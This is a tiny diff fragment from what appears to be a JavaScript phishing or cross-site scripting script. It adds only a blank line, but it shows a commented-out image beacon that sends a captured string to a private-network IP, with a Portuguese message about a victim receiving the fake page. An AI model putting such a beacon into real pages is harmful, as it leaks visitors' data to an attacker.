@@ -16,6 +16,7 @@ alert(y[1]);
 
 //alert('teste');
 
+
 //new Image().src = "http://192.168.0.123/?=" + str2 +"_Recebeu_a_pagina_falsa_aguarde_captura....";
 
  
